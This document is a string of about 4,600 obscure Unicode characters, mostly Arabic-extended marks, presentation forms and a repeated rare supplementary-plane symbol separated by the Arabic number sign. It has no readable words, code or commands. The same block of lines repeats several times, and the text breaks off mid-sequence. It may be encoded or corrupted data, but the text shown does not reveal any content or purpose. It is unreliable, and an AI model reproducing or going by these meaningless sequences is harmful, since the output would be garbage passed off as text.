࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬